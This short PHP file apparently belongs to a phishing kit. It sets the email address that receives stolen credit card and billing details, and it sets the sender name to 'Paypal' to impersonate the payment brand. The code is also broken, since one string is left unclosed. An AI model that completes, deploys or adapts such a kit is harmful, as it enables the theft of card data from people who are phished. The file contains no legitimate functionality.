﻿ <?php


# For cc and billing info put Your Email here
$spammer_email = "asil2014556.ml@gmail.com

# Your Name here
$spammerName = "Paypal";


?>

